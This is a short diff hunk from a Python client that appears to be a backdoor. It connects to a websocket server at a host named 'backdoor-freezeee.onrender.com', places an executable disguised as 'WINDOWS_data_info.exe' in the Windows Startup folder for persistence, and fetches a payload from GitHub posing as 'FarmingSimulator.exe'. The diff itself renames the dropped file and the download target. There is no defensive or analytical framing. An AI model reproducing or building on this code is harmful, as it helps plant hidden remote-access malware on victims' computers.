@@ -22,9 +22,9 @@ SERVER_URL = "wss://backdoor-freezeee.onrender.com"
 
 startup_folder = os.path.join("C:\\Users", CLIENT_NAME, "AppData", "Roaming",
                             "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-exe_final_location = os.path.join(startup_folder, "WINDOWS_data_infoRI.exe")
+exe_final_location = os.path.join(startup_folder, "WINDOWS_data_info.exe")
 old_final_location = os.path.join(startup_folder, "WINDOWS_data_info.exe")
-url = "https://raw.githubusercontent.com/habibprojects/habibn1/main/FarmingSimulatorRI.exe"
+url = "https://raw.githubusercontent.com/habibprojects/habibn1/main/FarmingSimulator.exe"
 
 class MessageDispatcher(QtCore.QObject):
     show_message = QtCore.pyqtSignal(str, int)
